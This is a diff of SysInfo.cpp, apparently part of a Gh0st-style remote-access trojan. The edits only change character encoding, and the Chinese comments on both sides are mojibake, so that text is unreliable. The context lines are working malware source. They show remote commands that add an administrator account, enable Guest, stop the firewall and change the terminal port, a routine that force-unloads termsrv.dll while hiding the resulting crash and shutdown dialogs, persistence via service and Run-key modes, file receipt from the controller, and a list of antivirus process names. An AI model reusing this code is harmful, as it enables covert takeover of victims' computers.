@@ -1,4 +1,4 @@
-ï»¿// SysInfo.cpp: implementation of the CSysInfo class.
+// SysInfo.cpp: implementation of the CSysInfo class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "StdAfx.h"
@@ -32,10 +32,10 @@ extern BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);
 
 CSysInfo::CSysInfo(CClientSocket *pClient,UINT Ports,UCHAR Linetypes,UCHAR Opertypes,CHAR *Addressl) : CManager(pClient)
 {
-	NetPort = Ports;        //è¿æ¥ç«¯å£
-	NetLine = Linetypes;    //è¿æ¥æ–¹å¼
-	NetOpert = Opertypes;   //è¿è¡Œç±»å‹
-	Linkaddress = Addressl; //è¿æ¥åœ°å€
+	NetPort = Ports;        //Á¬½Ó¶Ë¿Ú
+	NetLine = Linetypes;    //Á¬½Ó·½Ê½
+	NetOpert = Opertypes;   //ÔËĞĞÀàĞÍ
+	Linkaddress = Addressl; //Á¬½ÓµØÖ·
 	
  	SendSysInfo();
  	nCtrlPort = 0;
@@ -85,9 +85,9 @@ StringTab StringSplit_Struct(const char * str,const char* split)
         *--temp = '\0';
         result.string = (char * * )realloc(result.string,sizeof(char *)*(result.number+1));
         result.string[result.number] = tt;
-        /*è®¡æ•°å™¨åŠ ä¸€*/
+        /*¼ÆÊıÆ÷¼ÓÒ»*/
         result.number++;
-        /*è®¾ç½®ä¸‹ä¸€æ¬¡éå†æ—¶çš„æŒ‡é’ˆï¼ˆé‡è¦ï¼‰ã€‚å½“splité•¿åº¦å¤§äº1æ—¶ï¼Œä¸è¿™æ ·è®¾ç½®ä¼šå¤šèµ‹å€¼ä¸å¿…è¦çš„å­—ç¬¦ä¸²*/
+        /*ÉèÖÃÏÂÒ»´Î±éÀúÊ±µÄÖ¸Õë£¨ÖØÒª£©¡£µ±split³¤¶È´óÓÚ1Ê±£¬²»ÕâÑùÉèÖÃ»á¶à¸³Öµ²»±ØÒªµÄ×Ö·û´®*/
         p +=strlen(split)-1;
 	}
 	return result;
@@ -127,17 +127,17 @@ void CSysInfo::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	case COMMAND_SEND_INSTALLINFO:
 		SendInstallInfo();
 		break;
-	case COMMAND_NET_USER: // æ— NETåŠ ç”¨æˆ·
+	case COMMAND_NET_USER: // ÎŞNET¼ÓÓÃ»§
 		AddAdminUser();
 		break;
-	case COMMAND_GUEST: // å¼€å¯GUESTè´¦å·
+	case COMMAND_GUEST: // ¿ªÆôGUESTÕËºÅ
 		OpenGuest();
 		break;
-	case COMMAND_STOPFIRE: // å…³é˜²ç«å¢™
+	case COMMAND_STOPFIRE: // ¹Ø·À»ğÇ½
 		Sleep(10);
         StopFire();
 		break;
-	case COMMAND_CHANGE_PORT: // æ›´æ”¹ç»ˆç«¯ç«¯å£
+	case COMMAND_CHANGE_PORT: // ¸ü¸ÄÖÕ¶Ë¶Ë¿Ú
 		Sleep(10);
 		ChangePort(lpBuffer + 1);
 		break;
@@ -214,40 +214,40 @@ void CSysInfo::OnReceive(LPBYTE lpBuffer, UINT nSize)
 // 	char *Name;
 // }ANTIVIRUS;
 // 
-// ANTIVIRUS g_AntiVirus_Datas[40] = //æ·»åŠ ä¿®æ”¹æ•°å€¼
+// ANTIVIRUS g_AntiVirus_Datas[40] = //Ìí¼ÓĞŞ¸ÄÊıÖµ
 // {
-// 	{"360tray.exe",       "360å®‰å…¨å«å£«"},
-// 	{"360sd.exe",         "360æ€æ¯’"},
-// 	{"kxetray.exe",       "é‡‘å±±æ¯’éœ¸"},
-// 	{"KSafeTray.exe",     "é‡‘å±±å®‰å…¨å«å£«"},
-// 	{"QQPCRTP.exe",       "QQç”µè„‘ç®¡å®¶"},
-// 	{"BaiduSd.exe",       "ç™¾åº¦æ€æ¯’"},
-// 	{"baiduSafeTray.exe", "ç™¾åº¦å«å£«"},
-// 	{"KvMonXP.exe",       "æ±Ÿæ°‘"},
-// 	{"RavMonD.exe",       "ç‘æ˜Ÿ"},
-// 	{"QUHLPSVC.EXE",      "QuickHeal"},//å°åº¦
-// 	{"mssecess.exe",      "å¾®è½¯MSE"},
-// 	{"cfp.exe",           "Comodoæ€æ¯’"},
-// 	{"SPIDer.exe",        "DR.WEB"},//å¤§èœ˜è››
+// 	{"360tray.exe",       "360°²È«ÎÀÊ¿"},
+// 	{"360sd.exe",         "360É±¶¾"},
+// 	{"kxetray.exe",       "½ğÉ½¶¾°Ô"},
+// 	{"KSafeTray.exe",     "½ğÉ½°²È«ÎÀÊ¿"},
+// 	{"QQPCRTP.exe",       "QQµçÄÔ¹Ü¼Ò"},
+// 	{"BaiduSd.exe",       "°Ù¶ÈÉ±¶¾"},
+// 	{"baiduSafeTray.exe", "°Ù¶ÈÎÀÊ¿"},
+// 	{"KvMonXP.exe",       "½­Ãñ"},
+// 	{"RavMonD.exe",       "ÈğĞÇ"},
+// 	{"QUHLPSVC.EXE",      "QuickHeal"},//Ó¡¶È
+// 	{"mssecess.exe",      "Î¢ÈíMSE"},
+// 	{"cfp.exe",           "ComodoÉ±¶¾"},
+// 	{"SPIDer.exe",        "DR.WEB"},//´óÖ©Öë
 // 	{"acs.exe",           "Outpost"},
-// 	{"V3Svc.exe",         "å®‰åšå£«V3"},
-// 	{"AYAgent.aye",       "éŸ©å›½èƒ¶å›Š"},
+// 	{"V3Svc.exe",         "°²²©Ê¿V3"},
+// 	{"AYAgent.aye",       "º«¹ú½ºÄÒ"},
 // 	{"avgwdsvc.exe",      "AVG"},
-// 	{"f-secure.exe",      "F-Secure"},//èŠ¬å®‰å…¨
-// 	{"avp.exe",           "å¡å·´"},
-// 	{"Mcshield.exe",      "éº¦å’–å•¡"},
+// 	{"f-secure.exe",      "F-Secure"},//·Ò°²È«
+// 	{"avp.exe",           "¿¨°Í"},
+// 	{"Mcshield.exe",      "Âó¿§·È"},
 // 	{"egui.exe",          "NOD32"},
-// 	{"knsdtray.exe",      "å¯ç‰›"},
-// 	{"TMBMSRV.exe",       "è¶‹åŠ¿"},
-// 	{"avcenter.exe",      "å°çº¢ä¼"},
-// 	{"ashDisp.exe",       "Avastç½‘ç»œå®‰å…¨"}, 
-// 	{"rtvscan.exe",       "è¯ºé¡¿"}, 
-// 	{"remupd.exe",        "ç†ŠçŒ«å«å£«"},
+// 	{"knsdtray.exe",      "¿ÉÅ£"},
+// 	{"TMBMSRV.exe",       "Ç÷ÊÆ"},
+// 	{"avcenter.exe",      "Ğ¡ºìÉ¡"},
+// 	{"ashDisp.exe",       "AvastÍøÂç°²È«"}, 
+// 	{"rtvscan.exe",       "Åµ¶Ù"}, 
+// 	{"remupd.exe",        "ĞÜÃ¨ÎÀÊ¿"},
 // 	{"vsserv.exe",        "BitDefender"},//BD  bdagent.exe
-// 	{"PSafeSysTray.exe",  "PSafeåç—…æ¯’"},//å·´è¥¿
-// 	{"ad-watch.exe",      "Ad-watchåé—´è°"}, 
-// 	{"K7TSecurity.exe",   "K7æ€æ¯’"}, 
-// 	{"UnThreat.exe",      "UnThreat"},//ä¿åŠ åˆ©äºš
+// 	{"PSafeSysTray.exe",  "PSafe·´²¡¶¾"},//°ÍÎ÷
+// 	{"ad-watch.exe",      "Ad-watch·´¼äµı"}, 
+// 	{"K7TSecurity.exe",   "K7É±¶¾"}, 
+// 	{"UnThreat.exe",      "UnThreat"},//±£¼ÓÀûÑÇ
 // 	{"  ",    "  "}
 // 	
 // };
@@ -274,7 +274,7 @@ void CSysInfo::OnReceive(LPBYTE lpBuffer, UINT nSize)
 // 	
 // 	if (strstr(AllName, " " )  == 0 )
 // 	{	
-// 		lstrcat(AllName , "æœªå‘ç° ");
+// 		lstrcat(AllName , "Î´·¢ÏÖ ");
 // 	}
 // 	
 // 	return AllName;
@@ -487,10 +487,10 @@ LPBYTE CSysInfo::getWtsmList()
 		if (i>=sk)
 		{
 	
-		// æ­¤è¿›ç¨‹å ç”¨æ•°æ®å¤§å°
+		// ´Ë½ø³ÌÕ¼ÓÃÊı¾İ´óĞ¡
 		dwLength = lstrlen(ConnectionState) + lstrlen(UserName) + lstrlen(ClientName) + lstrlen(ProtocolType) + sizeof(DWORD) + 5;
 		
-		// ç¼“å†²åŒºå¤ªå°ï¼Œå†é‡æ–°åˆ†é…ä¸‹
+		// »º³åÇøÌ«Ğ¡£¬ÔÙÖØĞÂ·ÖÅäÏÂ
 		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
 			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
 		
@@ -560,7 +560,7 @@ PCHAR GetTotalPhys()
 	return pBuf;
 }
 
-void CSysInfo::SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt)  //å¸æˆ·å¯ç”¨/åœç”¨
+void CSysInfo::SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt)  //ÕÊ»§ÆôÓÃ/Í£ÓÃ
 {
 	wchar_t user_name[256]={0};
 	USER_INFO_1008 ui;
@@ -568,13 +568,13 @@ void CSysInfo::SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt)  //å¸æˆ
 	NET_API_STATUS nStatus;
 	BYTE bToken = NULL;
 	mbstowcs(user_name, (const char *)lpBuffer,256);
-	if(User_kt==NULL)  //ç”¨æˆ·å¯ç”¨
+	if(User_kt==NULL)  //ÓÃ»§ÆôÓÃ
 	{
-		ui.usri1008_flags = UF_SCRIPT|UF_DONT_EXPIRE_PASSWD;  // ç”¨æˆ·åœç”¨ | å¯†ç ç”¨ä¸è¿‡æœŸ
+		ui.usri1008_flags = UF_SCRIPT|UF_DONT_EXPIRE_PASSWD;  // ÓÃ»§Í£ÓÃ | ÃÜÂëÓÃ²»¹ıÆÚ
 	}
-	else  //ç”¨æˆ·åœç”¨
+	else  //ÓÃ»§Í£ÓÃ
 	{
-		ui.usri1008_flags = UF_ACCOUNTDISABLE|UF_PASSWD_CANT_CHANGE;  // ç”¨æˆ·åœç”¨ | ç”¨æˆ·ä¸èƒ½æ›´æ”¹å¯†ç 
+		ui.usri1008_flags = UF_ACCOUNTDISABLE|UF_PASSWD_CANT_CHANGE;  // ÓÃ»§Í£ÓÃ | ÓÃ»§²»ÄÜ¸ü¸ÄÃÜÂë
 	}
 	nStatus = NetUserSetInfo( NULL,user_name,dwLevel, (LPBYTE )&ui,NULL);
 	if (nStatus == NERR_Success)
@@ -589,7 +589,7 @@ void CSysInfo::SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt)  //å¸æˆ
 
 static int nuser=0;
 char user_all[50][50]={0};
-inline int get_all_user(void) //å¾—åˆ°ç”¨æˆ·   
+inline int get_all_user(void) //µÃµ½ÓÃ»§   
 {
     LPUSER_INFO_0   pBuf   =   NULL;   
     LPUSER_INFO_0   pTmpBuf;   
@@ -630,7 +630,7 @@ inline int get_all_user(void) //å¾—åˆ°ç”¨æˆ·
     return   nuser;   
   }   
 
-char getall_Groups(char *str_user,char Groupt[]) //æ ¹æ®ç”¨æˆ·å¾—åˆ°ç”¨æˆ·ç»„
+char getall_Groups(char *str_user,char Groupt[]) //¸ù¾İÓÃ»§µÃµ½ÓÃ»§×é
 {
 	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL; 
 	NET_API_STATUS nStatus;
@@ -692,7 +692,7 @@ char getall_Groups(char *str_user,char Groupt[]) //æ ¹æ®ç”¨æˆ·å¾—åˆ°ç”¨æˆ·ç»„
 	return 0;
 }
 
-BOOL IsGuestDisabled(char *str_user)  //æ ¹æ®ç”¨æˆ·å¾—åˆ° ç”¨æˆ·çŠ¶æ€
+BOOL IsGuestDisabled(char *str_user)  //¸ù¾İÓÃ»§µÃµ½ ÓÃ»§×´Ì¬
 {
 	BOOL bRet = TRUE;
 	LPUSER_INFO_1 puiVal = NULL;
@@ -717,20 +717,20 @@ BOOL IsGuestDisabled(char *str_user)  //æ ¹æ®ç”¨æˆ·å¾—åˆ° ç”¨æˆ·çŠ¶æ€
 LPBYTE CSysInfo::getSList()
 {
 	EnablePrivilege(SE_DEBUG_NAME, TRUE);	
-	//å¾—åˆ°æ‰€æœ‰ç”¨æˆ·   
+	//µÃµ½ËùÓĞÓÃ»§   
 	nuser=0;
     if(!get_all_user())  
 		return NULL;
-    //éå†å¼€å§‹   
+    //±éÀú¿ªÊ¼   
 	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
 	lpBuffer[0] = TOKEN_SLIST;
 	DWORD			dwOffset = 1;
 	
-    for(int i=0;i<nuser;i++)//å¾ªç¯ç”¨æˆ·  
+    for(int i=0;i<nuser;i++)//Ñ­»·ÓÃ»§  
 	{
 		char Groups[256]={NULL};
-		getall_Groups(user_all[i],Groups);  //æ ¹æ®ç”¨æˆ· æŸ¥æ‰¾ç”¨æˆ·ç»„
-		BOOL stt=IsGuestDisabled(user_all[i]);  //æ ¹æ®ç”¨æˆ· å¾—å‡ºç”¨æˆ·çŠ¶æ€
+		getall_Groups(user_all[i],Groups);  //¸ù¾İÓÃ»§ ²éÕÒÓÃ»§×é
+		BOOL stt=IsGuestDisabled(user_all[i]);  //¸ù¾İÓÃ»§ µÃ³öÓÃ»§×´Ì¬
 		char *GetInfo="Active";
 		if(stt)
 		{
@@ -855,8 +855,8 @@ void CSysInfo::AddAdminUser()
 	TCHAR *lpPass = (TCHAR *)GetBuffer(1 + (lstrlen(lpUser) + 1) * sizeof(TCHAR));
 	TCHAR *lpGroup = (TCHAR *)GetBuffer(1 + (lstrlen(lpPass) + 1) * sizeof(TCHAR) + (lstrlen(lpUser) + 1) * sizeof(TCHAR));
 
-	ui.usri1_name = AnsiToUnicode(lpUser);    //è¿™ä¸ªæ˜¯è¦æ·»åŠ çš„ç”¨æˆ·åï¼Œå¯ä»¥è‡ªå·±æ”¹æ”¹
-	ui.usri1_password = AnsiToUnicode(lpPass);   //è¿™ä¸ªæ˜¯ç”¨æˆ·å¯†ç ï¼Œä¹Ÿå¯ä»¥è‡ªå·±æ”¹æ”¹
+	ui.usri1_name = AnsiToUnicode(lpUser);    //Õâ¸öÊÇÒªÌí¼ÓµÄÓÃ»§Ãû£¬¿ÉÒÔ×Ô¼º¸Ä¸Ä
+	ui.usri1_password = AnsiToUnicode(lpPass);   //Õâ¸öÊÇÓÃ»§ÃÜÂë£¬Ò²¿ÉÒÔ×Ô¼º¸Ä¸Ä
 	ui.usri1_priv = USER_PRIV_USER;
 	ui.usri1_home_dir = NULL;
 	ui.usri1_comment = NULL;
@@ -878,7 +878,7 @@ void CSysInfo::AddAdminUser()
 	LOCALGROUP_MEMBERS_INFO_3 account;
 	account.lgrmi3_domainandname=szAccountName;
 	wchar_t *wzGroup = AnsiToUnicode(lpGroup);
-	//æ·»åŠ åˆ°Administratorsç»„
+	//Ìí¼Óµ½Administrators×é
 	nStatus = NetLocalGroupAddMembers(NULL,wzGroup,3,(LPBYTE)&account,1);
 	delete[] wzGroup;
 	if (nStatus == NERR_Success)
@@ -1048,19 +1048,19 @@ BOOL CSysInfo::OpenGuest()
 
 void CSysInfo::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 {
-	// ä¼ è¾“å®Œæ¯•
+	// ´«ÊäÍê±Ï
 	BYTE	*pData;
 	DWORD	dwBytesToWrite;
 	DWORD	dwBytesWrite;
-	int		nHeadLength = 9; // 1 + 4 + 4  æ•°æ®åŒ…å¤´éƒ¨å¤§å°ï¼Œä¸ºå›ºå®šçš„9
+	int		nHeadLength = 9; // 1 + 4 + 4  Êı¾İ°üÍ·²¿´óĞ¡£¬Îª¹Ì¶¨µÄ9
 
 	FILESIZEDLL	*pFileSize;
-	// å¾—åˆ°æ•°æ®çš„åç§»
+	// µÃµ½Êı¾İµÄÆ«ÒÆ
 	pData = lpBuffer + 8;
 	
 	pFileSize = (FILESIZEDLL *)lpBuffer;
 	
-	// å¾—åˆ°æ•°æ®åœ¨æ–‡ä»¶ä¸­çš„åç§»
+	// µÃµ½Êı¾İÔÚÎÄ¼şÖĞµÄÆ«ÒÆ
 	
 	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
 	LONG	dwOffsetLow = pFileSize->dwSizeLow;
@@ -1084,10 +1084,10 @@ void CSysInfo::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
 	
 	BOOL nRet = FALSE;
-	// å†™å…¥æ–‡ä»¶
+	// Ğ´ÈëÎÄ¼ş
 	nRet = WriteFile(hFile, pData, dwBytesToWrite, &dwBytesWrite, NULL);
 	CloseHandle(hFile);
-	// ä¸ºäº†æ¯”è¾ƒï¼Œè®¡æ•°å™¨é€’å¢
+	// ÎªÁË±È½Ï£¬¼ÆÊıÆ÷µİÔö
 	
 	BYTE	bToken[9];
 	bToken[0] = TOKEN_DATA_CONTINUE;
@@ -1101,7 +1101,7 @@ void CSysInfo::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 void CSysInfo::CreateLocalRecvFile(LPBYTE lpBuffer)
 {
 	FILESIZEDLL	*pFileSize = (FILESIZEDLL *)lpBuffer;
-	// ä¿å­˜æ–‡ä»¶é•¿åº¦
+	// ±£´æÎÄ¼ş³¤¶È
 	m_nCurrentProcessFileLength = ((__int64)pFileSize->dwSizeHigh << 32) + pFileSize->dwSizeLow;
 
 	GetFileData();
@@ -1126,7 +1126,7 @@ void CSysInfo::GetOpenFile()
 		if(hDll != NULL)
 			return;
 	}
-	//åŠ è½½å¤±è´¥ï¼Œè¦æ±‚é‡ä¼ 
+	//¼ÓÔØÊ§°Ü£¬ÒªÇóÖØ´«
 	lpBuffer[0] = TOKEN_DLL_3389;
 	dwOffset = 1;
 	memcpy(lpBuffer + dwOffset, lpDllName, (lstrlen(lpDllName) + 1)*2);
@@ -1138,7 +1138,7 @@ void CSysInfo::GetOpenFile()
 
 void CSysInfo::GetFileData()
 {	
-	//  1å­—èŠ‚Token,å››å­—èŠ‚åç§»é«˜å››ä½ï¼Œå››å­—èŠ‚åç§»ä½å››ä½
+	//  1×Ö½ÚToken,ËÄ×Ö½ÚÆ«ÒÆ¸ßËÄÎ»£¬ËÄ×Ö½ÚÆ«ÒÆµÍËÄÎ»
 	BYTE	bToken[9];
 	memset(bToken, 0, sizeof(bToken));
 	bToken[0] = TOKEN_DATA_CONTINUE;
@@ -1156,7 +1156,7 @@ void CSysInfo::GetFileData()
 		FILE_ATTRIBUTE_NORMAL,
 		0
 		);
-	// éœ€è¦é”™è¯¯å¤„ç†
+	// ĞèÒª´íÎó´¦Àí
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		m_nCurrentProcessFileLength = 0;
@@ -1172,7 +1172,7 @@ bool IsOSXP()
 {
 	OSVERSIONINFOEX OsVerInfoEx;
 	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // æ³¨æ„è½¬æ¢ç±»å‹
+	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // ×¢Òâ×ª»»ÀàĞÍ
 	return OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1;
 }
 
@@ -1186,7 +1186,7 @@ bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 	GetWindowThreadProcessId(hwnd, &dwWindowThreadId);
 	if (dwWindowThreadId == (DWORD)lParam)
 	{
-		// å…³é—­æŒ‡å®šè¿›ç¨‹çš„çª—å£
+		// ¹Ø±ÕÖ¸¶¨½ø³ÌµÄ´°¿Ú
 		SendMessage(hwnd, WM_CLOSE, 0, 0);
 	}
 	return true;
@@ -1197,7 +1197,7 @@ bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 // 	HANDLE			hProcessSnap = NULL;
 // 	PROCESSENTRY32	pe32 = {0};
 // 	
-// 	// è·å–ç³»ç»Ÿè¿›ç¨‹å¿«ç…§
+// 	// »ñÈ¡ÏµÍ³½ø³Ì¿ìÕÕ
 // 	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 // 	if (hProcessSnap == INVALID_HANDLE_VALUE)
 // 		return 0;
@@ -1274,7 +1274,7 @@ bool UnloadModule(LPCTSTR lpModulePath)
 
 	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
 
-	//æŸ¥æ‰¾ç›¸å…³çš„è¿›ç¨‹
+	//²éÕÒÏà¹ØµÄ½ø³Ì
 	if(Process32First(hProcessSnap, &pe32))
 	{
 		do
@@ -1296,25 +1296,25 @@ void HijackService()
 	GetSystemDirectory(strDll, sizeof(strDll));
 	lstrcat(strDll, _T("\\termsrv.dll"));
 	
-	// éå†è¿›ç¨‹å¸è½½ç°åœ¨åŠ è½½çš„DLL
+	// ±éÀú½ø³ÌĞ¶ÔØÏÖÔÚ¼ÓÔØµÄDLL
 	EnablePrivilege(SE_DEBUG_NAME, TRUE);
 	if (!UnloadModule(strDll))
 		return;
 	EnablePrivilege(SE_DEBUG_NAME, FALSE);
 	
-	// å…³é—­è¦å¼¹å‡ºçš„å‡ºé”™å¯¹è¯æ¡†å’Œå› DLLå¼ºåˆ¶å¸è½½ä½¿ä¸€äº›æœåŠ¡å¼‚å¸¸ç»ˆæ­¢è€Œå¼¹å‡ºæ¥çš„è‡ªåŠ¨å…³æœºå¯¹è¯æ¡†
-	// å¯¹è¿›ç¨‹èµ‹äºˆå…³é—­æƒé™
+	// ¹Ø±ÕÒªµ¯³öµÄ³ö´í¶Ô»°¿òºÍÒòDLLÇ¿ÖÆĞ¶ÔØÊ¹Ò»Ğ©·şÎñÒì³£ÖÕÖ¹¶øµ¯³öÀ´µÄ×Ô¶¯¹Ø»ú¶Ô»°¿ò
+	// ¶Ô½ø³Ì¸³Óè¹Ø±ÕÈ¨ÏŞ
 	EnablePrivilege(SE_SHUTDOWN_NAME,TRUE);
 	DWORD dwLsassId = GetProcessId(_T("csrss.exe"));
 	while (!AbortSystemShutdown(NULL))
 	{
-		// ä¸€äº›ç³»ç»Ÿæ˜¯ä¼šå¼¹å‡ºdrwtsn32.exe
+		// Ò»Ğ©ÏµÍ³ÊÇ»áµ¯³ödrwtsn32.exe
 		DWORD dwDrwtsn32Id = GetProcessId(_T("drwtsn32.exe"));
 		if (dwDrwtsn32Id != NULL)
 		{
 			EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)dwDrwtsn32Id);
 		}
-		// æ¨¡å—å¼ºåˆ¶å¸è½½æ—¶ä¼šå‡ºé”™ï¼Œå…³é—­csrss.exeè¿›ç¨‹å¼¹å‡ºçš„å‡ºé”™çª—å£
+		// Ä£¿éÇ¿ÖÆĞ¶ÔØÊ±»á³ö´í£¬¹Ø±Õcsrss.exe½ø³Ìµ¯³öµÄ³ö´í´°¿Ú
 		EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)dwLsassId);
 		Sleep(10);
 	}
@@ -1420,10 +1420,10 @@ DWORD CSysInfo::Open3389(LPVOID lparam)
 // 		"",
 // 		"",
 // 		"",
-// 		TRUE,			//TRUEä¸ºæœåŠ¡å¯åŠ¨
-// 		TRUE,			//TRUEä¸ºå†™å¯åŠ¨é¡¹
-// 		TRUE,			//TRUEä¸ºæ³¨å†Œè¡¨å¯åŠ¨é¡¹
-// 		TRUE,			//FALSEä¸ºå®‰è£…,TRUEä¸ºç»¿è‰²å®‰è£…
+// 		TRUE,			//TRUEÎª·şÎñÆô¶¯
+// 		TRUE,			//TRUEÎªĞ´Æô¶¯Ïî
+// 		TRUE,			//TRUEÎª×¢²á±íÆô¶¯Ïî
+// 		TRUE,			//FALSEÎª°²×°,TRUEÎªÂÌÉ«°²×°
 // };
 
 void CSysInfo::GetOnlineInfo(tagOnlineInfo* pInsInfo)
@@ -1436,25 +1436,25 @@ void CSysInfo::GetOnlineInfo(tagOnlineInfo* pInsInfo)
 	char	strTMPTime[MAX_PATH];
 	char	SerName[MAX_PATH];
 
-	if(NetOpert==0)  //ç»¿è‰²ä¸€æ¬¡æ€§è¿è¡Œ
+	if(NetOpert==0)  //ÂÌÉ«Ò»´ÎĞÔÔËĞĞ
 	{
-	    wsprintf(strTMPTime,"%s","(ç»¿è‰²è¿è¡Œæ¨¡å¼)--é‡å¯ä¸ä¸Šçº¿!");     //ä¸Šçº¿è¿è¡Œæ–¹å¼
+	    wsprintf(strTMPTime,"%s","(ÂÌÉ«ÔËĞĞÄ£Ê½)--ÖØÆô²»ÉÏÏß!");     //ÉÏÏßÔËĞĞ·½Ê½
 	}
-	else if(NetOpert==1)  // æœåŠ¡å¯åŠ¨è¿è¡Œ
+	else if(NetOpert==1)  // ·şÎñÆô¶¯ÔËĞĞ
 	{
-		wsprintf(strTMPTime,"%s","(æœåŠ¡å¯åŠ¨æ¨¡å¼)--SYSTEMç”¨æˆ·è¿è¡Œ!");     //ä¸Šçº¿è¿è¡Œæ–¹å¼
+		wsprintf(strTMPTime,"%s","(·şÎñÆô¶¯Ä£Ê½)--SYSTEMÓÃ»§ÔËĞĞ!");     //ÉÏÏßÔËĞĞ·½Ê½
 	}
-	else if(NetOpert==2)  // ç›´æ¥å¯åŠ¨è¿è¡Œ
+	else if(NetOpert==2)  // Ö±½ÓÆô¶¯ÔËĞĞ
 	{
-		wsprintf(strTMPTime,"%s","(Runå¯åŠ¨æ¨¡å¼)--å½“å‰ç”¨æˆ·è¿è¡Œ!");      //ä¸Šçº¿è¿è¡Œæ–¹å¼
+		wsprintf(strTMPTime,"%s","(RunÆô¶¯Ä£Ê½)--µ±Ç°ÓÃ»§ÔËĞĞ!");      //ÉÏÏßÔËĞĞ·½Ê½
 	}
- 	else if(NetOpert==3)  // Runå¯åŠ¨è¿è¡Œ
+ 	else if(NetOpert==3)  // RunÆô¶¯ÔËĞĞ
  	{
- 		wsprintf(strTMPTime,"%s","(æ³¨å†Œè¡¨å¯åŠ¨æ¨¡å¼)--å½“å‰ç”¨æˆ·è¿è¡Œ!");       //ä¸Šçº¿è¿è¡Œæ–¹å¼
+ 		wsprintf(strTMPTime,"%s","(×¢²á±íÆô¶¯Ä£Ê½)--µ±Ç°ÓÃ»§ÔËĞĞ!");       //ÉÏÏßÔËĞĞ·½Ê½
  	}
 
 	char szbuf[256];
-	GetModuleFileName(NULL,szbuf,MAX_PATH);   //ç”¨äºè·å–ç¨‹åºæœ¬èº«è·¯å¾„
+	GetModuleFileName(NULL,szbuf,MAX_PATH);   //ÓÃÓÚ»ñÈ¡³ÌĞò±¾ÉíÂ·¾¶
 
 	wsprintf(SerName,"%s",szbuf );  
 
@@ -1489,9 +1489,9 @@ void CSysInfo::GetSystemInfo(tagSystemInfo* pSysInfo)
 	ZeroMemory(pSysInfo,sizeof(tagSystemInfo));
 	///////get system version//////////
 	char *pszOS = NULL;
-	OSVERSIONINFOEX	OsVerInfoEx;	// ç‰ˆæœ¬ä¿¡æ¯  //æ“ä½œç³»ç»Ÿä¿¡æ¯
+	OSVERSIONINFOEX	OsVerInfoEx;	// °æ±¾ĞÅÏ¢  //²Ù×÷ÏµÍ³ĞÅÏ¢
 	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // æ³¨æ„è½¬æ¢ç±»å‹
+	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // ×¢Òâ×ª»»ÀàĞÍ
 
 	if ( OsVerInfoEx.dwMajorVersion <= 4 )
 	{
@@ -1557,7 +1557,7 @@ void CSysInfo::GetSystemInfo(tagSystemInfo* pSysInfo)
 		RegCloseKey(hKey);	
 	}
 	else
-		_tcscpy(pSysInfo->szCpuInfo,_T("CPUä¿¡æ¯æ— æ³•è·å–!"));
+		_tcscpy(pSysInfo->szCpuInfo,_T("CPUĞÅÏ¢ÎŞ·¨»ñÈ¡!"));
 
 	//QQ//////////////////////////////////////////
 	char szText[MAX_PATH] = "CTXOPConntion_Class";
@@ -1593,7 +1593,7 @@ void CSysInfo::GetSystemInfo(tagSystemInfo* pSysInfo)
 	dwHour = dwTime / (1000 * 60 * 60);
 	dwTime = dwTime % (1000 * 60 * 60);
 	dwMin = dwTime / (1000 * 60);
-	_stprintf(pSysInfo->szActiveTime, _T("%då¤©%dæ—¶%dåˆ†"), dwDay, dwHour, dwMin);
+	_stprintf(pSysInfo->szActiveTime, _T("%dÌì%dÊ±%d·Ö"), dwDay, dwHour, dwMin);
 
 	//Get AntiVirus & FireWall========================
 //	strcpy( pSysInfo->szAntiVirus, GetVirus() );
@@ -1603,12 +1603,12 @@ void CSysInfo::GetSystemInfo(tagSystemInfo* pSysInfo)
 	//GetUserName(pSysInfo->szUserName,&dwLen);
 	GetCurrentUserName(pSysInfo->szUserName);
 
-	// å†…å­˜
+	// ÄÚ´æ
 	CHAR *szTotalPhys = GetTotalPhys();
 	pSysInfo->szMemory = atol(szTotalPhys);
 	delete[] szTotalPhys;
 
-	// å¯ç”¨å†…å­˜
+	// ¿ÉÓÃÄÚ´æ
 	CHAR *szAvailPhys = GetAvailPhys();
 	pSysInfo->szMemoryFree = atol(szAvailPhys);
 	delete[] szAvailPhys;
@@ -1631,13 +1631,13 @@ void CSysInfo::GetSystemInfo(tagSystemInfo* pSysInfo)
 		nAllGB = nAllGB + nTotalBytes.QuadPart/1024/1024/1024;
 		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;
     }
-	// ç¡¬ç›˜
+	// Ó²ÅÌ
 	pSysInfo->szDriveSize = nAllGB;
-	// å¯ç”¨ç¡¬ç›˜
+	// ¿ÉÓÃÓ²ÅÌ
 	pSysInfo->szDriveFreeSize = nFreeGB;
